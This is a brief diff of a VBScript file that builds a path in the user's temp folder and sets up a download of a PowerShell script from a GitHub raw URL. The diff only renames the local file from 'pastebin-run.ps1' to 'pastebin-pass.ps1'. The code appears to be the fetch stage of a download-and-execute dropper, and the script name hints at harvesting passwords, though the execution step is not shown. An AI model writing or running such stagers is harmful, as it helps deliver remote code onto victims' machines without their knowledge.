@@ -1,7 +1,7 @@
 Dim i, objFile, objFSO, objHTTP, strFile
 Set WshShell = CreateObject("WScript.Shell")
 Home = WshShell.ExpandEnvironmentStrings("%tmp%")
-file = Home & "\pastebin-run.ps1"
+file = Home & "\pastebin-pass.ps1"
 myURL = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-pass.ps1"
 myPath = file
 Const ForReading = 1, ForWriting = 2, ForAppending = 8
